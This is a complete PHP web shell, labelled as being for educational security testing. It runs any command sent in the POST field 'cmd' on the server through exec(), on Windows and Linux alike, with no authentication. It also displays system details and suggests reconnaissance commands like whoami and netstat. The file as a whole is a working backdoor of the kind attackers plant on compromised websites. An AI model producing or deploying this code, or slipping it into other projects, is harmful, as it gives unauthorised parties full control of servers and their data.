<?php
// Terminal Web Shell - For Educational Security Testing Only
// Cross-platform (Windows/Linux) command execution

header('Content-Type: text/html; charset=utf-8');

// Function to execute commands cross-platform
function executeCommand($cmd) {
    $output = '';
    $status = 0;
    
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        // Windows commands
        $cmd = "cmd /c " . $cmd . " 2>&1";
    } else {
        // Linux/Unix commands
        $cmd = $cmd . " 2>&1";
    }
    
    exec($cmd, $output, $status);
    return [
        'output' => implode("\n", $output),
        'status' => $status,
        'command' => $cmd
    ];
}

// Handle command execution
$result = null;
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $result = executeCommand($command);
}

// Get current directory
$currentDir = getcwd();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal Web Shell - Security Lab</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Courier New', monospace;
            background: #1e1e1e;
            color: #00ff00;
            height: 100vh;
            overflow: hidden;
        }
        
        .terminal {
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            background: #2d2d2d;
            padding: 10px 20px;
            border-bottom: 1px solid #444;
        }
        
        .header h1 {
            font-size: 14px;
            color: #00ff00;
            font-weight: normal;
        }
        
        .system-info {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }
        
        .output-container {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            background: #000;
        }
        
        .command-line {
            display: flex;
            align-items: center;
            padding: 10px 20px;
            background: #2d2d2d;
            border-top: 1px solid #444;
        }
        
        .prompt {
            color: #00ff00;
            margin-right: 10px;
            white-space: nowrap;
        }
        
        .command-input {
            flex: 1;
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
        }
        
        .output-line {
            margin-bottom: 5px;
            line-height: 1.4;
            word-wrap: break-word;
        }
        
        .command-output {
            color: #00ff00;
        }
        
        .error-output {
            color: #ff4444;
        }
        
        .command-history {
            color: #888;
            margin-bottom: 10px;
        }
        
        .directory-info {
            color: #66ccff;
            margin-bottom: 10px;
        }
        
        .status-line {
            color: #ffaa00;
            margin-bottom: 10px;
            padding: 5px;
            background: #333;
            border-left: 3px solid #ffaa00;
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #1e1e1e;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #444;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header">
            <h1>🖥️ Terminal Web Shell - Security Testing Interface</h1>
            <div class="system-info">
                OS: <?php echo php_uname('s'); ?> | 
                PHP: <?php echo PHP_VERSION; ?> | 
                User: <?php echo get_current_user(); ?> |
                Directory: <?php echo $currentDir; ?>
            </div>
        </div>
        
        <div class="output-container" id="output">
            <div class="directory-info">
                <strong>Current Directory:</strong> <?php echo $currentDir; ?>
            </div>
            
            <?php if ($result): ?>
                <div class="command-history">
                    <strong>$ <?php echo htmlspecialchars($result['command']); ?></strong>
                </div>
                
                <?php if ($result['status'] === 0): ?>
                    <div class="command-output">
                        <pre><?php echo htmlspecialchars($result['output']); ?></pre>
                    </div>
                <?php else: ?>
                    <div class="error-output">
                        <pre><?php echo htmlspecialchars($result['output']); ?></pre>
                    </div>
                <?php endif; ?>
                
                <div class="status-line">
                    Command completed with exit status: <?php echo $result['status']; ?>
                </div>
            <?php endif; ?>
            
            <div class="output-line">
                <em>Type commands below. Cross-platform support for Windows and Linux.</em>
            </div>
            <div class="output-line">
                <strong>Common Commands:</strong>
            </div>
            <div class="output-line">
                Windows: dir, ipconfig, whoami, netstat, systeminfo
            </div>
            <div class="output-line">
                Linux: ls, ifconfig, whoami, netstat, uname -a
            </div>
            <div class="output-line">
                Cross-platform: pwd, echo, php -v, python --version
            </div>
        </div>
        
        <form method="POST" class="command-line">
            <span class="prompt">$</span>
            <input type="text" name="cmd" class="command-input" placeholder="Enter command..." autofocus autocomplete="off">
            <button type="submit" style="display: none;">Execute</button>
        </form>
    </div>

    <script>
        // Auto-scroll to bottom
        function scrollToBottom() {
            const output = document.getElementById('output');
            output.scrollTop = output.scrollHeight;
        }
        
        // Focus input on load
        document.querySelector('.command-input').focus();
        
        // Scroll to bottom when page loads
        window.onload = scrollToBottom;
        
        // Handle form submission
        document.querySelector('form').addEventListener('submit', function() {
            setTimeout(scrollToBottom, 100);
        });
        
        // Command history
        let commandHistory = [];
        let historyIndex = -1;
        
        document.querySelector('.command-input').addEventListener('keydown', function(e) {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (commandHistory.length > 0) {
                    if (historyIndex === -1) {
                        historyIndex = commandHistory.length - 1;
                    } else if (historyIndex > 0) {
                        historyIndex--;
                    }
                    this.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (commandHistory.length > 0 && historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    this.value = commandHistory[historyIndex];
                } else {
                    historyIndex = -1;
                    this.value = '';
                }
            } else if (e.key === 'Enter') {
                const cmd = this.value.trim();
                if (cmd) {
                    commandHistory.push(cmd);
                    historyIndex = -1;
                }
            }
        });
    </script>
</body>
</html>
